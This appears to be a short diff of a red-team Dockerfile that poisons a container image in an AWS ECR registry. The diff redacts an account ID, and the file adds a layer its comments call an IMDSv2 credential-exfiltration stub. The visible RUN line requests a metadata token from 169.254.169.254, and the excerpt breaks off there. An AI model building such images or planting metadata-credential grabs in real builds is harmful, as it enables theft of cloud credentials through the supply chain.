@@ -2,7 +2,7 @@
 # and injects a malicious layer, then pushes under a plausible tag.
 # The layer is an IMDSv2 credential-exfil stub (TeamTNT / Capital One pattern).
 # Exfil endpoint is a placeholder. Demonstrates the technique, steals nothing.
-FROM 221082197153.dkr.ecr.us-east-1.amazonaws.com/scs-prod-ecr-app:git-2b0a3d797885
+FROM <AWS_ACCOUNT_ID>.dkr.ecr.us-east-1.amazonaws.com/scs-prod-ecr-app:git-2b0a3d797885
 USER root
 RUN printf '#!/bin/sh\n\
 TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")\n\
